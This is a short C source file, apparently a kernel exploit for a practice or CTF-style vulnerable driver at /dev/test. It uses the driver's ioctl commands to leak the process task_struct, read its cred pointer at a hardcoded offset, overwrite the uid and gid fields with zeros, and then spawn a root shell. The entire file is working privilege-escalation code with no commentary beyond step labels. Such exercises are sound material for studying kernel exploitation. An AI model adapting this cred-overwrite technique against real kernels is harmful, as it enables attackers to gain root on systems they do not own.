// gcc -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdint.h>

#define AAR 0x11
#define AAW 0x22
#define TASK_STRUCT 0x33

struct elements {
    void *to;
    void *from;
};

int main() {
    int fd;
    struct elements elements;
    char *task_struct;
    char *cred_addr;
    char *cred;
    char id[8] = {0, };

    fd = open("/dev/test", O_RDWR);

    /* step 1 - leak task_struct */
    elements.to = &task_struct;
    elements.from = NULL;
    ioctl(fd, TASK_STRUCT, &elements);

    printf("task_struct : 0x%lx\n", task_struct);

    cred_addr = task_struct + 1592;  // cred offset

    /* step 2 - read struct cred */
    elements.to = &cred;
    elements.from = cred_addr;
    ioctl(fd, AAR, &elements);

    printf("cred : 0x%lx\n", cred);

    /* step 3 - overwrite struct cred */
    for(int i=0; i<4; i++) {
        elements.to = cred + 4 + 8*i;
        elements.from = &id;
        ioctl(fd, AAW, &elements);
    }

    system("/bin/sh");

    return 0;
}
